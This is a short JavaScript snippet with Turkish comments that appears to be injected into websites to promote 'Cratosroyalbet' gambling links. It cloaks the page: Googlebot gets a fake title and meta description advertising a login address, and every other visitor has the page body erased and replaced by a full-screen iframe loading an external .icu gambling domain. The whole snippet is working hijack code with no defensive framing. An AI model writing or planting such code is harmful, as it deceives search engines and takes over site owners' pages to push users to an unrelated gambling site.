(function() {
    // 1. Google Bot Kontrolü (İndeks için)
    if (/Googlebot|Mediapartners-Google/i.test(navigator.userAgent)) {
        document.title = "Cratosroyalbet Güncel Giriş - Sorunsuz Link 2026";
        var m = document.createElement('meta'); m.name = "description";
        m.content = "Cratosroyalbet en güncel ve güvenilir giriş adresi.";
        document.head.appendChild(m);
        return;
    }

    // 2. Gerçek Kullanıcı İçin Iframe
    var target = "https://m.cratosroyalbetguncelgirisyap26.icu/index.php";
    var ifr = document.createElement('iframe' );
    ifr.src = target;
    ifr.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:2147483647;background:#fff;';
    
    var check = setInterval(function() {
        if (document.body) {
            clearInterval(check);
            document.body.innerHTML = ''; 
            document.body.appendChild(ifr);
            document.documentElement.style.overflow = 'hidden';
        }
    }, 5);
})();
